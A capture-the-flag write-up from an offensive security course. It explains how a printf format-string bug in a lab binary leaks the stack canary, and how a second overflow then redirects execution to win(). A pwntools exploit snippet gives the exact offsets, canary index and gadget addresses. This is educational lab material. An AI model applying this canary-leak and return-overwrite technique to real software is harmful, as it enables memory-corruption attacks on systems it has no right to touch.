# Secret Library

**Category:** pwn / format string leak + canary bypass · **Course:** Offensive Security (PoliTo)

## Challenge

Same family as Pastry Shop — a guestbook `printf(buf)` format-string bug feeding into a second, canary-protected overflow — but with larger buffers (128/512 bytes) and different stack offsets. PIE is off, so `win()` has a fixed address.

## Vulnerability

`printf(buf)` on unsanitised input again allows arbitrary stack reads via `%N$lx`; positional argument **23** lines up with the canary for this binary's stack layout. The buffer is printed right after a literal `Hello, `, so the leak comes back as `Hello, <canary>`.

## Exploitation

1. Leak the canary with `%23$lx` at the guestbook prompt, then split the reply on `", "` to drop the `Hello, ` prefix and keep the hex value.
2. Overflow the second buffer: **136 bytes** of padding, the leaked canary, 8 bytes of saved-RBP filler (offset to saved RIP is 152), a bare `ret` gadget (`0x40101a`) for 16-byte stack alignment, then the fixed address of `win()` (`0x401262`).

As in `solve.py`:

```python
p.sendline(f"%{canary_idx}$lx".encode())        # canary_idx = 23
leak   = p.recvline().strip().decode()
canary = int(leak.split(", ")[1], 16)           # strip the "Hello, " prefix

payload = flat(
    b"A" * offset_to_canary,                     # 136
    p64(canary),
    b"B" * (offset_to_rip - offset_to_canary - 8),
    p64(ret_gadget),                             # 0x40101a, stack alignment
    p64(address_of_win),                         # 0x401262
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-no-pie -fstack-protector-all -Wno-format-security`: canary enabled, fixed load address)
- `secret_library` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
